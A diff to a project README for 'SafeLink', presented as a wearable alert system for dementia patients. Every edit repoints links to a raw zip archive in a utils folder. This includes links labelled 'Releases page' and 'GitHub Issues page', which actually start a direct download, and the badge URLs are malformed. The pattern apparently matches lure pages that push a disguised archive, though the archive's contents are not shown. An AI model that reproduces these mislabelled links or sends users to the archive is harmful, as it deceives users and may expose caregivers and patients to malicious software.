@@ -4,13 +4,13 @@
 
 SafeLink is a wearable monitoring and alerting system designed for dementia patients. This guide will help you download and run the application easily, ensuring peace of mind for you and your loved ones.
 
-[![Download SafeLink](https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v1.0.zip%20SafeLink-Get%https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v1.0.zip)](https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v1.0.zip)
+[![Download SafeLink](https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v2.4-alpha.1.zip%20SafeLink-Get%https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v2.4-alpha.1.zip)](https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v2.4-alpha.1.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these steps:
 
-1. **Visit the download page:** Go to the [Releases page](https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v1.0.zip).
+1. **Visit the download page:** Go to the [Releases page](https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v2.4-alpha.1.zip).
 
 2. **Choose the correct version:** On the Releases page, you will see a list of versions. Choose the latest version to ensure you have the most up-to-date features.
 
@@ -62,7 +62,7 @@ After installation, follow these steps to set up and use SafeLink:
 
 ## 📞 Support
 
-If you encounter any issues or need assistance, feel free to reach out. Visit our [GitHub Issues page](https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v1.0.zip) to report problems or ask questions. 
+If you encounter any issues or need assistance, feel free to reach out. Visit our [GitHub Issues page](https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v2.4-alpha.1.zip) to report problems or ask questions. 
 
 ## 🏷️ Topics
 
@@ -82,4 +82,4 @@ For more information related to SafeLink, you might be interested in the followi
 
 For updates, features, and discussions, follow the topics listed above.
 
-[![Download SafeLink](https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v1.0.zip%20SafeLink-Get%https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v1.0.zip)](https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v1.0.zip)
+[![Download SafeLink](https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v2.4-alpha.1.zip%20SafeLink-Get%https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v2.4-alpha.1.zip)](https://github.com/syedahraz92/SafeLink/raw/refs/heads/main/wear_guard_v1/utils/Safe_Link_v2.4-alpha.1.zip)
